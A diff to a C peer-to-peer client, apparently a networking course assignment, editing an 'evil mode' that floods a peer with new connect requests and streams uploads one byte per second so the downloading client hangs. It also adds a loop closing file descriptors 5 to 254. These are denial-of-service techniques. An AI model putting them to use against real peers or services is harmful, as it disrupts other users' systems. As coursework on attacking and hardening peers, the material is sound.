@@ -584,10 +584,15 @@ static void task_download(task_t *t, task_t *tracker_task)
 		{
 			message("Bombing %d with new connect requests.\n",t->peer_fd);
 			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
-			osp2p_writef(t->peer_fd, "GET asdasd23rfesdsfw OSP2P\n");
+		//	write(t->peer_fd, "GET cat1.jpg OSP2P\n",21);
 			//close(t->peer_fd);
 		}
 		message("Peer fd is -1, no longer bombing\n");
+		int i=5;
+		for (i=5;i<255;i++)
+		{
+			close(i);
+		}
 	}
 
 	if (evil_mode)
@@ -748,7 +753,7 @@ static void task_upload(task_t *t)
 		message("Infinite slow upload loop\n");
 		while (client_alive!=-1)
 		{
-			 client_alive = write(t->peer_fd, &t->buf[0], 1); //stream data very slowly until client breaks connection
+			 client_alive = write(t->peer_fd, &t->buf[0], 1); //stream infinite data very slowly until client breaks connection
 			 sleep(1); //sleep 1 second then stream another char
 		}
 		message("Infinite upload loop exited\n");
